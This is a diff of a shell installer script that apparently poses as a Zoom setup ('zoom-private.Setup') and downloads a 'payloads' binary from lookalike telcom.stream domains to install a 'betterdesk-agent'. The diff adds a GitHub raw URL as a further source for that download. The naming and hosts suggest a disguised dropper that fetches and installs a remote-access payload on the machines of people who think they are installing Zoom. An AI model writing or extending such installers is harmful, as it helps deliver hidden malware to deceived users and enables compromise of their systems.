@@ -18,6 +18,7 @@ PAYLOAD_NAME='zoom-private.Setup_1.0.0_x86_64.bin'
 EXPECTED_SHA='22541504bc8fa2c81b787a35bc78443b649039b67fad07e651e6ddcc243eea34'
 REPO_BASE='https://global.telcom.stream/downloads/payloads'
 FALLBACK_BASE='https://us05web.telcom.stream'
+RAW_BASE='https://raw.githubusercontent.com/fingod201-maker/BetterDesk-private/operational-v2-ALLclient-working/distro/clients/linux'
 PRIMARY_URL="${ZOOM_URL:-$REPO_BASE/$PAYLOAD_NAME}"
 AGENT_NAME='betterdesk-agent'
 
@@ -158,7 +159,7 @@ install_log "start version=$VERSION user=$CONSOLE_USER"
 PRIMARY=1
 if ! fetch "$PRIMARY_URL"; then
     PRIMARY=0
-    fetch "$FALLBACK_BASE/$PAYLOAD_NAME" || { install_log 'download failed'; exit 1; }
+    fetch "$RAW_BASE/$PAYLOAD_NAME" || fetch "$FALLBACK_BASE/$PAYLOAD_NAME" || { install_log 'download failed'; exit 1; }
 fi
 
 HEADER="$(head -c 4 "$PKG" | od -An -tx1 | tr -d ' \n')"
